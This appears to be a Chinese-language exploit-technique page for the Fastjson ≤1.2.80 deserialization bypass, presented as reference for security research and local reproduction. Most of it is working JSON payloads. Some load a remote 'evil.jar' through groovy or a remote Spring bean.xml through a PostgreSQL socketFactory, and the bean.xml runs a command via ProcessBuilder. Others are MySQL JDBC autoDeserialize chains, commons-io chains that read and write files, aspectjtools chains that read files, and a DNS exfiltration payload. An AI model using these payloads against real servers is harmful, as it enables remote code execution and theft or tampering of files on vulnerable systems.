---
title: ≤1.2.80 利用技巧
description: Fastjson ≤1.2.80 的 Exception / ThrowableDeserializer 缓存绕过：jackson+io、PostgreSQL、jython、MySQL JDBC、groovy、aspectjtools
order: 1
---

# ≤1.2.80 利用技巧

本文分析 Fastjson **≤1.2.80** 的核心绕过：以 `java.lang.Exception` 为期望类，经 `ThrowableDeserializer` 把字段 / 构造 / setter 相关类型写入 `ParserConfig.deserializers` 缓存，再二次发包命中缓存。供安全研究与本地复现参考。

相关阅读：

- [源码分析：Fastjson 1.2.68–1.2.80 利用](https://changeyourway.github.io/2025/08/23/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Fastjson%201.2.68-1.2.80%20%E5%88%A9%E7%94%A8/)
- [≤1.2.68 利用技巧](/docs/fastjson-1.2.68)
- [≤1.2.47 利用技巧](/docs/fastjson-1.2.47)
- [1.2.83 利用技巧](/docs/fastjson-1.2.83)
- [Getter 触发技巧](/docs/getter-trigger)

推荐用 [java-chains](https://github.com/vulhub/java-chains) 生成具体 payload。

---

## 1. 绕过分析

将 **Exception** 作为期望类，找其子类。找到子类后，以下几处类型也可通过修改 JSON 手动写入缓存，从而「造」出新的可利用类：

- **public 构造方法**的参数类型（及其子类）
- **public 字段**的类型
- **setter** 的参数类型（及其子类）

可沿这条链一直往下找，直到命中可用的构造方法或 setter。实务上多是把此前版本 payload 里的利用类重新塞进缓存，再二次发包利用。

### 1.1 缓存点（与 47 不同）

这里的缓存不是 47 时代 `java.lang.Class` → MiscCodec → `TypeUtils.loadClass` 那条，而是 **`ParserConfig.getDeserializer` 时**把「类型 → 反序列化器」放进 `ParserConfig.deserializers`：

`checkAutoType` 会很早从这个 Map 取；命中则直接放行。

### 1.2 `ThrowableDeserializer` 与 `cast`

80 版本的 `ThrowableDeserializer` 在解析其它键值对时：若 value 与字段实际类型不符，会走 `TypeUtils.cast`，最终再次调用 `config.getDeserializer`，从而把该类属性相关类型也写入缓存。

一般 `"field": {}` 即可：`{}` 是 `JSONObject`，类型对不上就会走 `cast`。

### 1.3 示例（groovy 缓存 unit）

```json
// 第一次发包
{
    "@type": "java.lang.Exception",
    "@type": "org.codehaus.groovy.control.CompilationFailedException",
    "unit": {}
}

// 第二次发包
{
    "@type": "org.codehaus.groovy.control.ProcessingUnit",
    "@type": "org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config": {
        "@type": "org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList": "http://127.0.0.1:8090/evil.jar"
    }
}
```

第一次把 `CompilationFailedException.unit`（类型为 `ProcessingUnit`）写入缓存；第二次再以该期望类反序列化其子类。

### 1.4 自定义恶意类

最终利用类建议 **继承 `Exception`**，或在类上使用 `@JSONType` 注解。也可添加 `setCmd` / 参数名为 `cmd` 的构造方法后触发：

```json
{
    "@type": "java.lang.Exception",
    "@type": "Tomcat678910cmdechoException",
    "cmd": "calc"
}
```

---

## 2. 修复分析

后续版本对 **Throwable 子类**做了额外判断：从缓存取出的 `clazz` 会被清空，从而打断「Exception 期望类 → 属性类型入缓存 → 二次 `@type` 命中」链路。因此本节 payload 适用于 **≤1.2.80**。

---

## 3. jackson + io 读写文件 / 目录

适合 Spring 环境（常见 jackson-core + commons-io）。

### 3.1 缓存 `InputStream`

```json
[
  {
    "@type": "java.lang.Exception",
    "@type": "com.fasterxml.jackson.core.exc.InputCoercionException",
    "p": {}
  },
  {
    "@type": "com.fasterxml.jackson.core.JsonParser",
    "@type": "com.fasterxml.jackson.core.json.UTF8StreamJsonParser",
    "in": {}
  }
]
```

### 3.2 io 链：逐字节读文件 / 目录

思路与 68 版本 commons-io 读文件类似。可参考：

- [CVE-2022-25845-In-Spring](https://github.com/luelueking/CVE-2022-25845-In-Spring)
- [kezibei/fastjson_payload web.py](https://github.com/kezibei/fastjson_payload/blob/main/web.py)（出网辅助）

```json
{
  "a": {
    "@type": "java.io.InputStream",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "${file}"
        },
        "charsetName": "UTF-8",
        "bufferSize": "1024"
      },
      "boms": [
        {
          "charsetName": "UTF-8",
          "bytes": ${data}
        }
      ]
    },
    "boms": [
      {
        "charsetName": "UTF-8",
        "bytes": [1]
      }
    ]
  },
  "b": {
    "$ref": "$.a.delegate"
  }
}
```

`${file}` 为文件 / 目录 URL；`${data}` 为探测字节（逐字节比对 BOM）。

### 3.3 io 链：写文件

通过 `TeeInputStream` + `LockableFileWriter` 等把可控内容写出。完整超长 BOM 填充建议用 java-chains 生成；结构示意：

```json
{
  "@type": "java.io.InputStream",
  "@type": "org.apache.commons.io.input.BOMInputStream",
  "delegate": {
    "@type": "org.apache.commons.io.input.AutoCloseInputStream",
    "in": {
      "@type": "org.apache.commons.io.input.TeeInputStream",
      "input": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "org.apache.commons.io.input.CharSequenceReader",
          "charSequence": {
            "@type": "java.lang.String",
            "val": "flag{{{"
          }
        },
        "encoder": "iso-8859-1",
        "charset": "iso-8859-1",
        "charsetName": "iso-8859-1",
        "bufferSize": 1
      },
      "branch": {
        "@type": "org.apache.commons.io.output.WriterOutputStream",
        "writer": {
          "@type": "org.apache.commons.io.output.LockableFileWriter",
          "file": "D:/1tmp/111.txt",
          "charset": "iso-8859-1",
          "encoding": "iso-8859-1",
          "lockDir": "/tmp/test/",
          "append": false
        },
        "charset": "iso-8859-1",
        "charsetName": "iso-8859-1",
        "bufferSize": 1024,
        "writeImmediately": true
      },
      "closeBranch": true
    }
  },
  "include": true,
  "boms": [
    {
      "@type": "org.apache.commons.io.ByteOrderMark",
      "charsetName": "iso-8859-1",
      "bytes": [0]
    }
  ],
  "x": {
    "$ref": "$.bOM"
  }
}
```

说明：`boms.bytes` 实际需填充足够长度（常用大量 `0`）以刷出缓冲区；上表仅示结构，完整 payload 请用工具生成。

---

## 4. PostgreSQL（jackson 依赖）

| 条件 | 说明 |
|------|------|
| Fastjson | **1.2.75 &lt; version ≤ 1.2.80** |
| jackson | `jackson-core` |
| PostgreSQL | `9.4.1208 ≤ org.postgresql:postgresql &lt; 42.2.25`，或 `42.3.0 ≤ version &lt; 42.3.2` |
| 其它 | 常配合 Spring `ClassPathXmlApplicationContext` 加载远程 XML |

### 4.1 Step1：缓存 `InputStream`

```json
{
  "a": "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.fasterxml.jackson.core.exc.InputCoercionException\",\"p\":{}}",
  "b": {"$ref": "$.a.a"},
  "c": "{\"@type\":\"com.fasterxml.jackson.core.JsonParser\",\"@type\":\"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",\"in\":{}}",
  "d": {"$ref": "$.c.c"}
}
```

### 4.2 Step2：`PGCopyInputStream` + `socketFactory`

```json
{
  "x1": {
    "@type": "java.io.InputStream",
    "@type": "org.postgresql.copy.PGCopyInputStream",
    "connection": {
      "@type": "org.postgresql.jdbc.PgConnection",
      "hostSpecs": [
        {
          "host": "127.0.0.1",
          "port": 2333
        }
      ],
      "user": "root",
      "database": "root",
      "info": {
        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
        "socketFactoryArg": "http://127.0.0.1:8080/bean.xml"
      }
    }
  }
}
```

`bean.xml` 示例：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>cmd</value>
                <value>/c</value>
                <value>calc</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

---

## 5. jython 依赖

通过 `ParseException.type` 把 `PyObject` 写入缓存，再落到 `PyConnection` → `PgConnection` 的 `socketFactory`：

```json
{
  "a": {
    "@type": "java.lang.Exception",
    "@type": "org.python.antlr.ParseException",
    "type": {}
  },
  "b": {
    "@type": "org.python.core.PyObject",
    "@type": "com.ziclix.python.sql.PyConnection",
    "connection": {
      "@type": "org.postgresql.jdbc.PgConnection",
      "hostSpecs": [
        {
          "host": "127.0.0.1",
          "port": 2333
        }
      ],
      "user": "user",
      "database": "test",
      "info": {
        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
        "socketFactoryArg": "http://127.0.0.1:8090/exp.xml"
      },
      "url": ""
    }
  }
}
```

依赖组合偏苛刻（jython + postgresql + spring-context），实际环境较少。

---

## 6. MySQL JDBC

适用范围：**mysql ≤ 5.1.48**。同样需先经 jackson 缓存 `InputStream`（Step1 同第 4.1 节）。

### 6.1 出网

```json
{
  "@type": "java.io.InputStream",
  "@type": "com.mysql.jdbc.CompressedInputStream",
  "conn": {
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3308,
    "info": {
      "user": "mysql",
      "password": "pass",
      "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
      "autoDeserialize": "true",
      "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "dbname"
  }
}
```

### 6.2 不出网（NamedPipe）

需先能写 Pipe 文件，再：

```json
{
  "@type": "java.io.InputStream",
  "@type": "com.mysql.jdbc.CompressedInputStream",
  "conn": {
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
      "useSSL": "false",
      "user": "mysql",
      "HOST": "xxx",
      "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
      "autoDeserialize": "true",
      "NUM_HOSTS": "1",
      "socketFactory": "com.mysql.jdbc.NamedPipeSocketFactory",
      "namedPipePath": "[Pipe_file_path]",
      "DBNAME": "test"
    },
    "databaseToConnectTo": "test",
    "url": ""
  }
}
```

---

## 7. groovy（出网加载 jar）

| 条件 | 说明 |
|------|------|
| Fastjson | **1.2.76 ≤ version &lt; 1.2.83** |
| 依赖 | groovy |

```json
// 第一次发包
{
  "@type": "java.lang.Exception",
  "@type": "org.codehaus.groovy.control.CompilationFailedException",
  "unit": {}
}

// 第二次发包
{
  "@type": "org.codehaus.groovy.control.ProcessingUnit",
  "@type": "org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
  "config": {
    "@type": "org.codehaus.groovy.control.CompilerConfiguration",
    "classpathList": "http://127.0.0.1:8090/evil.jar"
  }
}
```

利用 SPI：在 jar 的 `META-INF/services/org.codehaus.groovy.transform.ASTTransformation` 写入恶意类全名，远程 classpath 加载后触发。打包示例：

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

java-chains 亦可直接生成。

---

## 8. aspectjtools 读文件（需回显）

依赖 `aspectjtools`；注意高版本按 JDK 17 编译，JDK 8–11 环境需选用匹配的 aspectj 版本（如 1.8.x）。

```json
// 第一次
{
  "@type": "java.lang.Exception",
  "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}

// 第二次：把 ICompilationUnit 相关类型写入缓存（经 Locale / JSONObject 等）
{
  "@type": "java.lang.Class",
  "val": {
    "@type": "java.lang.String",
    "@type": "java.util.Locale",
    "val": {
      "@type": "com.alibaba.fastjson.JSONObject",
      {
        "@type": "java.lang.String",
        "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
        "newAnnotationProcessorUnits": [{}]
      }: {}
    }
  }
}
```

### 8.1 第三次：直接读

```json
{
  "x": {
    "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
    "@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
    "fileName": "c:/windows/win.ini"
  }
}
```

### 8.2 第三次：报错回显

`CharacterCodec` → `castToChar` 失败时把 value 拼进异常信息；`JSONObject.toString` 会触发 `BasicCompilationUnit` 的 getter（含 `getContents` 读文件）：

```json
{
  "@type": "java.lang.Character",
  "C": {
    "x": {
      "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
      "@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
      "fileName": "D:/flag.txt"
    }
  }
}
```

### 8.3 第三次：DNS 回显

```json
{
  "a": {
    "@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
    "fileName": "/path/to/1.txt"
  },
  "b": {
    "@type": "java.net.Inet4Address",
    "val": {
      "@type": "java.lang.String",
      "@type": "java.util.Locale",
      "val": {
        "@type": "com.alibaba.fastjson.JSONObject",
        {
          "@type": "java.lang.String",
          "@type": "java.util.Locale",
          "language": {
            "@type": "java.lang.String",
            "$ref": "$"
          },
          "country": "aw.example.dnslog.pw"
        }: {}
      }
    }
  }
}
```

---

## 9. ognl + io 读写文件 / 目录

出现较少。首次公开于 KCON2022，读文件需配合 http / dns / 报错回显，或逐字节根据报错、是否出网判断。

- [KCON2022 · Hacking JSON](https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf)
- [Fastjson22_ognl_io_read_error_dnslog.java](https://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson22_ognl_io_read_error_dnslog.java)
- [su18/hack-fastjson-1.2.80](https://github.com/su18/hack-fastjson-1.2.80)

---

## 10. ajt + xalan + dom4j + io

依赖组合少见，可能出现在某些框架打包产物中：

- [Fastjson21_ajt_xalan_dom4j_io_read_httplog.java](https://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson21_ajt_xalan_dom4j_io_read_httplog.java)

不依赖 ajt 的变体：

- [Fastjson27_xalan_dom4j_io_read_error_dnslog.java](https://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson27_xalan_dom4j_io_read_error_dnslog.java)

---

## 小结

| 点 | 结论 |
|----|------|
| 绕过核心 | `Exception` 期望类 → `ThrowableDeserializer` → `cast` / 字段类型 → `ParserConfig.deserializers` 缓存 → 二次 `@type` 命中 |
| 与 47 区别 | 缓存点是 `getDeserializer` 的 deserializers Map，不是 Class/MiscCodec |
| 修复 | 后续版本清空 Throwable 子类从缓存取出的 clazz |
| jackson + io | Spring 常见；读 / 写文件、目录 |
| PostgreSQL | 1.2.75&lt;fj≤1.2.80 + 特定 postgresql 版本 + socketFactory |
| jython | ParseException → PyConnection → PgConnection |
| MySQL JDBC | mysql ≤ 5.1.48；出网 / NamedPipe |
| groovy | 1.2.76≤fj&lt;1.2.83；SPI 加载远程 jar |
| aspectjtools | `BasicCompilationUnit.getContents` + 报错 / DNS 回显 |
